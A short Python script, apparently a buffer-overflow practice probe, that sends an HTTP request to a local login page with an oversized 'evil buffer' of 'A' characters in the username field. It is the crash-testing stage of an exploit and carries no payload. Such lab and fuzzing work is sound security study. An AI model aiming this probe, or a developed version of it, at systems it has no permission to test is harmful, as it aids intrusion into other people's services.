#!/usr/bin/python
import socket

IP = "127.0.0.1"
PORT = 80


try:
    print("\nSending evil buffer ")

    size = 100
    inputBuffer = "A"*size

    content = "username=" + inputBuffer + "&password=A"

    buffer = "GET /login HTTP/1.1\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, int(PORT)))

    s.send(buffer.encode('ascii'))

    s.close()

    print("Done")

except:
    print("Could not connect")